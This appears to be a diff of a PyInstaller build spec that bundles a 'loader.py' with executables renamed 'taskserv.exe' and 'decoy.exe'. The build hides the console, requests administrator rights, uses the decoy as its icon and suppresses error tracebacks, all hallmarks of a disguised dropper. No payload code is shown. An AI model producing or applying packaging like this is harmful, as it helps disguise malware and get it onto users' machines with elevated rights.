@@ -4,7 +4,7 @@
 a = Analysis(
     ['loader.py'],
     pathex=[],
-    binaries=[('installer.exe', '.'), ('phony-bin.exe', '.')],
+    binaries=[('taskserv.exe', '.'), ('decoy.exe', '.')],
     datas=[],
     hiddenimports=[],
     hookspath=[],
@@ -29,11 +29,11 @@ exe = EXE(
     upx_exclude=[],
     runtime_tmpdir=None,
     console=False,
-    disable_windowed_traceback=False,
+    disable_windowed_traceback=True,
     argv_emulation=False,
     target_arch=None,
     codesign_identity=None,
     entitlements_file=None,
     uac_admin=True,
-    icon=['icon.ico'],
+    icon=['decoy.exe'],
 )
